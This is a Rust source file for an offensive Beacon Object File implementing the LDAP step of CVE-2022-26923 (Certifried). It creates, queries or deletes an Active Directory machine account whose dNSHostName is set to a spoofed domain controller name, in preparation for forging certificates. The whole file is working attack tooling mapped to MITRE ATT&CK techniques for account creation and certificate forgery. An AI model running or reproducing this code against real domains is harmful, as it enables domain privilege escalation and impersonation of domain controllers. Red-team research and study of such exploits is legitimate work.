//! # CVE-2022-26923 BOF
//!
//! Creates, inspects, or removes a machine account in the default Computers
//! container through an authenticated and sealed LDAP session. The create
//! action sets the supplied domain controller name as `dNSHostName`, which is
//! the directory primitive used by CVE-2022-26923 before certificate enrollment.
//! Every mutation is verified and removal is a separate explicit action.
//!
//! ## MITRE ATT&CK
//! - T1136.002 - Create Account: Domain Account
//! - T1649 - Steal or Forge Authentication Certificates
//!
//! ## Arguments
//! - `str`: `query`, `create`, or `delete`.
//! - `str`: Domain controller hostname or address.
//! - `str`: Machine name without the trailing `$`.
//! - `str`: Password for `create`; pass an empty string otherwise.
//! - `str`: Spoofed domain controller FQDN for `create`; pass an empty string otherwise.

#![no_std]

use alloc::format;
use alloc::string::String;
use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use rustbof::{eprintln, println};
use windows_sys::Win32::Networking::Ldap::{LDAP_BERVAL, LDAPModA, LDAPModA_0};

const LDAP_PORT: u32 = 389;
const LDAP_AUTH_NEGOTIATE: u32 = 0x0486;
const LDAP_SCOPE_BASE: u32 = 0;
const LDAP_SUCCESS: u32 = 0;
const LDAP_NO_SUCH_OBJECT: u32 = 32;
const LDAP_ALREADY_EXISTS: u32 = 68;
const LDAP_OPT_PROTOCOL_VERSION: i32 = 17;
const LDAP_OPT_REFERRALS: i32 = 8;
const LDAP_OPT_SIGN: i32 = 149;
const LDAP_OPT_ENCRYPT: i32 = 150;
const LDAP_MOD_ADD: u32 = 0;
const LDAP_MOD_BVALUES: u32 = 0x80;
const LDAP_VERSION3: u32 = 3;

type Ldap = c_void;
type LdapMessage = c_void;

unsafe extern "C" {
    fn ldap_initA(host: *const u8, port: u32) -> *mut Ldap;
    fn ldap_set_optionA(ld: *mut Ldap, option: i32, value: *const c_void) -> u32;
    fn ldap_bind_sA(ld: *mut Ldap, dn: *const u8, cred: *const u8, method: u32) -> u32;
    fn ldap_search_sA(
        ld: *mut Ldap,
        base: *const u8,
        scope: u32,
        filter: *const u8,
        attrs: *const *const u8,
        attrs_only: u32,
        result: *mut *mut LdapMessage,
    ) -> u32;
    fn ldap_first_entry(ld: *mut Ldap, result: *mut LdapMessage) -> *mut LdapMessage;
    fn ldap_get_valuesA(ld: *mut Ldap, entry: *mut LdapMessage, attr: *const u8) -> *mut *mut u8;
    fn ldap_value_freeA(values: *mut *mut u8) -> u32;
    fn ldap_msgfree(result: *mut LdapMessage) -> u32;
    fn ldap_add_sA(ld: *mut Ldap, dn: *const u8, attrs: *mut *mut LDAPModA) -> u32;
    fn ldap_delete_sA(ld: *mut Ldap, dn: *const u8) -> u32;
    fn ldap_unbind(ld: *mut Ldap) -> u32;
}

struct PackedArgs<'a> {
    buffer: &'a [u8],
    offset: usize,
}

impl<'a> PackedArgs<'a> {
    fn new(buffer: &'a [u8]) -> Option<Self> {
        let declared = u32::from_le_bytes(buffer.get(..4)?.try_into().ok()?) as usize;
        (declared == buffer.len().checked_sub(4)?).then_some(Self { buffer, offset: 4 })
    }

    fn string(&mut self, maximum: usize, empty: bool) -> Option<&'a str> {
        let length_end = self.offset.checked_add(4)?;
        let length =
            u32::from_le_bytes(self.buffer.get(self.offset..length_end)?.try_into().ok()?) as usize;
        self.offset = length_end;
        if length == 0 || length > maximum.checked_add(1)? {
            return None;
        }
        let value_end = self.offset.checked_add(length)?;
        let value = self.buffer.get(self.offset..value_end)?;
        self.offset = value_end;
        if value.last().copied() != Some(0) || value[..length - 1].contains(&0) {
            return None;
        }
        let value = core::str::from_utf8(&value[..length - 1]).ok()?;
        (empty || !value.is_empty()).then_some(value)
    }

    fn done(&self) -> bool {
        self.offset == self.buffer.len()
    }
}

struct Connection(*mut Ldap);

impl Drop for Connection {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { ldap_unbind(self.0) };
        }
    }
}

fn c_string(value: &str) -> Vec<u8> {
    let mut output = Vec::with_capacity(value.len() + 1);
    output.extend_from_slice(value.as_bytes());
    output.push(0);
    output
}

fn c_value(pointer: *const u8) -> String {
    if pointer.is_null() {
        return String::new();
    }
    unsafe {
        let mut length = 0usize;
        while *pointer.add(length) != 0 && length < 4096 {
            length += 1;
        }
        String::from_utf8_lossy(core::slice::from_raw_parts(pointer, length)).into_owned()
    }
}

fn valid_machine(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 15
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
}

fn valid_host(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 253
        && !value.starts_with('.')
        && !value.ends_with('.')
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.'))
}

fn connect(server: &str) -> Result<Connection, (u32, &'static str)> {
    let server = c_string(server.trim_start_matches('\\'));
    let handle = unsafe { ldap_initA(server.as_ptr(), LDAP_PORT) };
    if handle.is_null() {
        return Err((1, "ldap_initA"));
    }
    let connection = Connection(handle);
    let version = LDAP_VERSION3;
    let off = 0u32;
    let on = 1u32;
    for (option, value, stage) in [
        (LDAP_OPT_PROTOCOL_VERSION, &version, "LDAP protocol version"),
        (LDAP_OPT_REFERRALS, &off, "LDAP referrals"),
        (LDAP_OPT_SIGN, &on, "LDAP signing"),
        (LDAP_OPT_ENCRYPT, &on, "LDAP sealing"),
    ] {
        let status =
            unsafe { ldap_set_optionA(connection.0, option, value as *const u32 as *const c_void) };
        if status != LDAP_SUCCESS {
            return Err((status, stage));
        }
    }
    let status = unsafe {
        ldap_bind_sA(
            connection.0,
            core::ptr::null(),
            core::ptr::null(),
            LDAP_AUTH_NEGOTIATE,
        )
    };
    if status != LDAP_SUCCESS {
        return Err((status, "LDAP negotiate bind"));
    }
    Ok(connection)
}

fn first_text_value(
    connection: &Connection,
    entry: *mut LdapMessage,
    attribute: &[u8],
) -> Option<String> {
    let values = unsafe { ldap_get_valuesA(connection.0, entry, attribute.as_ptr()) };
    if values.is_null() {
        return None;
    }
    let first = unsafe { *values };
    let value = (!first.is_null()).then(|| c_value(first));
    unsafe { ldap_value_freeA(values) };
    value
}

fn search_base(
    connection: &Connection,
    base: &str,
    attributes: &[*const u8],
) -> Result<Option<*mut LdapMessage>, u32> {
    let base = c_string(base);
    let mut result = core::ptr::null_mut();
    let status = unsafe {
        ldap_search_sA(
            connection.0,
            base.as_ptr(),
            LDAP_SCOPE_BASE,
            b"(objectClass=*)\0".as_ptr(),
            attributes.as_ptr(),
            0,
            &mut result,
        )
    };
    if status == LDAP_NO_SUCH_OBJECT {
        return Ok(None);
    }
    if status != LDAP_SUCCESS || result.is_null() {
        return Err(status);
    }
    let entry = unsafe { ldap_first_entry(connection.0, result) };
    if entry.is_null() {
        unsafe { ldap_msgfree(result) };
        Ok(None)
    } else {
        Ok(Some(result))
    }
}

fn naming_context(connection: &Connection) -> Result<String, u32> {
    let attributes = [b"defaultNamingContext\0".as_ptr(), core::ptr::null()];
    let result = search_base(connection, "", &attributes)?.ok_or(LDAP_NO_SUCH_OBJECT)?;
    let entry = unsafe { ldap_first_entry(connection.0, result) };
    let value =
        first_text_value(connection, entry, b"defaultNamingContext\0").ok_or(LDAP_NO_SUCH_OBJECT);
    unsafe { ldap_msgfree(result) };
    value
}

fn machine_dn(connection: &Connection, machine: &str) -> Result<String, u32> {
    Ok(format!(
        "CN={},CN=Computers,{}",
        machine,
        naming_context(connection)?
    ))
}

fn query(connection: &Connection, machine: &str) -> Result<Option<(String, String)>, u32> {
    let dn = machine_dn(connection, machine)?;
    let attributes = [
        b"sAMAccountName\0".as_ptr(),
        b"dNSHostName\0".as_ptr(),
        core::ptr::null(),
    ];
    let Some(result) = search_base(connection, &dn, &attributes)? else {
        return Ok(None);
    };
    let entry = unsafe { ldap_first_entry(connection.0, result) };
    let sam = first_text_value(connection, entry, b"sAMAccountName\0").unwrap_or_default();
    let dns = first_text_value(connection, entry, b"dNSHostName\0").unwrap_or_default();
    unsafe { ldap_msgfree(result) };
    Ok(Some((sam, dns)))
}

fn string_mod(attribute: &mut Vec<u8>, values: &mut Vec<*mut u8>) -> LDAPModA {
    LDAPModA {
        mod_op: LDAP_MOD_ADD,
        mod_type: attribute.as_mut_ptr(),
        mod_vals: LDAPModA_0 {
            modv_strvals: values.as_mut_ptr(),
        },
    }
}

fn create(
    connection: &Connection,
    machine: &str,
    password: &str,
    spoofed_dns: &str,
) -> Result<(), (u32, &'static str)> {
    if query(connection, machine)
        .map_err(|status| (status, "pre-create query"))?
        .is_some()
    {
        return Err((
            LDAP_ALREADY_EXISTS,
            "account already exists; refusing overwrite",
        ));
    }

    let dn =
        c_string(&machine_dn(connection, machine).map_err(|status| (status, "naming context"))?);
    let mut object_class_name = c_string("objectClass");
    let mut sam_name = c_string("sAMAccountName");
    let mut uac_name = c_string("userAccountControl");
    let mut dns_name = c_string("dNSHostName");
    let mut spn_name = c_string("servicePrincipalName");
    let mut password_name = c_string("unicodePwd");

    let mut object_classes = ["top", "person", "organizationalPerson", "user", "computer"]
        .iter()
        .map(|value| c_string(value))
        .collect::<Vec<_>>();
    let mut object_class_values = object_classes
        .iter_mut()
        .map(|value| value.as_mut_ptr())
        .chain(core::iter::once(core::ptr::null_mut()))
        .collect::<Vec<_>>();
    let mut sam_value = c_string(&format!("{}$", machine));
    let mut sam_values = vec![sam_value.as_mut_ptr(), core::ptr::null_mut()];
    let mut uac_value = c_string("4096");
    let mut uac_values = vec![uac_value.as_mut_ptr(), core::ptr::null_mut()];
    let mut dns_value = c_string(spoofed_dns);
    let mut dns_values = vec![dns_value.as_mut_ptr(), core::ptr::null_mut()];
    let mut spn_strings = [
        format!("HOST/{}", machine),
        format!("RestrictedKrbHost/{}", machine),
    ]
    .iter()
    .map(|value| c_string(value))
    .collect::<Vec<_>>();
    let mut spn_values = spn_strings
        .iter_mut()
        .map(|value| value.as_mut_ptr())
        .chain(core::iter::once(core::ptr::null_mut()))
        .collect::<Vec<_>>();

    let quoted = format!("\"{}\"", password);
    let mut password_bytes = Vec::with_capacity(quoted.len() * 2);
    for unit in quoted.encode_utf16() {
        password_bytes.extend_from_slice(&unit.to_le_bytes());
    }
    let mut password_berval = LDAP_BERVAL {
        bv_len: password_bytes.len() as u32,
        bv_val: password_bytes.as_mut_ptr(),
    };
    let mut password_values = vec![&mut password_berval, core::ptr::null_mut()];

    let mut modifications = [
        string_mod(&mut object_class_name, &mut object_class_values),
        string_mod(&mut sam_name, &mut sam_values),
        string_mod(&mut uac_name, &mut uac_values),
        string_mod(&mut dns_name, &mut dns_values),
        string_mod(&mut spn_name, &mut spn_values),
        LDAPModA {
            mod_op: LDAP_MOD_ADD | LDAP_MOD_BVALUES,
            mod_type: password_name.as_mut_ptr(),
            mod_vals: LDAPModA_0 {
                modv_bvals: password_values.as_mut_ptr(),
            },
        },
    ];
    let mut pointers = modifications
        .iter_mut()
        .map(|modification| modification as *mut LDAPModA)
        .chain(core::iter::once(core::ptr::null_mut()))
        .collect::<Vec<_>>();

    let status = unsafe { ldap_add_sA(connection.0, dn.as_ptr(), pointers.as_mut_ptr()) };
    if status != LDAP_SUCCESS {
        return Err((status, "LDAP add"));
    }

    match query(connection, machine).map_err(|status| (status, "post-create query"))? {
        Some((sam, dns))
            if sam.eq_ignore_ascii_case(&format!("{}$", machine))
                && dns.eq_ignore_ascii_case(spoofed_dns) =>
        {
            Ok(())
        }
        _ => Err((13, "post-create verification")),
    }
}

fn delete(connection: &Connection, machine: &str) -> Result<(), (u32, &'static str)> {
    let Some((sam, _)) =
        query(connection, machine).map_err(|status| (status, "pre-delete query"))?
    else {
        return Err((LDAP_NO_SUCH_OBJECT, "account does not exist"));
    };
    if !sam.eq_ignore_ascii_case(&format!("{}$", machine)) {
        return Err((13, "directory object is not the expected machine account"));
    }
    let dn =
        c_string(&machine_dn(connection, machine).map_err(|status| (status, "naming context"))?);
    let status = unsafe { ldap_delete_sA(connection.0, dn.as_ptr()) };
    if status != LDAP_SUCCESS {
        return Err((status, "LDAP delete"));
    }
    if query(connection, machine)
        .map_err(|status| (status, "post-delete query"))?
        .is_some()
    {
        Err((13, "post-delete verification"))
    } else {
        Ok(())
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let parsed = if args.is_null() || len == 0 {
        None
    } else {
        let buffer = unsafe { core::slice::from_raw_parts(args, len) };
        PackedArgs::new(buffer).and_then(|mut parser| {
            let action = parser.string(16, false)?;
            let server = parser.string(253, false)?;
            let machine = parser.string(15, false)?;
            let password = parser.string(256, true)?;
            let spoofed_dns = parser.string(253, true)?;
            parser
                .done()
                .then_some((action, server, machine, password, spoofed_dns))
        })
    };

    let Some((action, server, machine, password, spoofed_dns)) = parsed else {
        eprintln!(
            "Usage: cve_2022_26923 <query|create|delete> <dc> <machine> <password_or_empty> <spoofed_dc_fqdn_or_empty>"
        );
        return;
    };
    if !valid_machine(machine) {
        eprintln!(
            "Machine name must be 1-15 letters, digits, hyphens, or underscores without a trailing $."
        );
        return;
    }
    if !valid_host(server) {
        eprintln!("Domain controller name is invalid.");
        return;
    }

    let connection = match connect(server) {
        Ok(connection) => connection,
        Err((status, stage)) => {
            eprintln!("{} failed: 0x{:X}", stage, status);
            return;
        }
    };

    if action.eq_ignore_ascii_case("query") {
        match query(&connection, machine) {
            Ok(Some((sam, dns))) => println!(
                "Machine account {} found | sAMAccountName={} | dNSHostName={}",
                machine,
                sam,
                if dns.is_empty() { "<unset>" } else { &dns }
            ),
            Ok(None) => println!("Machine account {} was not found.", machine),
            Err(status) => eprintln!("LDAP query failed: 0x{:X}", status),
        }
    } else if action.eq_ignore_ascii_case("create") {
        if password.is_empty() || !valid_host(spoofed_dns) {
            eprintln!(
                "Create requires a non-empty password and a valid spoofed domain controller FQDN."
            );
            return;
        }
        match create(&connection, machine, password, spoofed_dns) {
            Ok(()) => println!(
                "Machine account {} created and verified with dNSHostName={}. Certificate enrollment is a separate action; delete this account after use.",
                machine, spoofed_dns
            ),
            Err((status, stage)) => eprintln!("{} failed: 0x{:X}", stage, status),
        }
    } else if action.eq_ignore_ascii_case("delete") {
        match delete(&connection, machine) {
            Ok(()) => println!("Machine account {} deleted and verified absent.", machine),
            Err((status, stage)) => eprintln!("{} failed: 0x{:X}", stage, status),
        }
    } else {
        eprintln!("Unsupported action. Use query, create, or delete.");
    }
}
